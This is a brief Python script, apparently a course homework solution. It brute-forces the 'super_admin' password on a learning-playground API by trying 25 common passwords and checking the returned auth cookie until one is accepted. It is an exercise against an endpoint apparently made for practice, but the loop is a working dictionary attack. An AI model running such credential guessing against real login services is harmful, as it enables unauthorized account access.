import requests

passwords = ["123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345", "iloveyou", "111111",
             "123123", "abc123", "qwerty123",
             "1q2w3e4r", "admin", "qwertyuiop", "654321", "555555", "lovely", "7777777", "welcome", "888888",
             "princess", "dragon", "password1", "123qwe"]

for password in passwords:
    response_get_auth_cookie = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework",
                                             data={"login": "super_admin", "password": password})

    auth_cookie_value = response_get_auth_cookie.cookies["auth_cookie"]

    response_check_auth_cookie = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie",
                                              cookies={"auth_cookie": auth_cookie_value})
    auth_cookie_value_checked = response_check_auth_cookie.text
    if auth_cookie_value_checked == "You are authorized":
        print(f"{auth_cookie_value_checked}. Correct password: {password}.")
        break
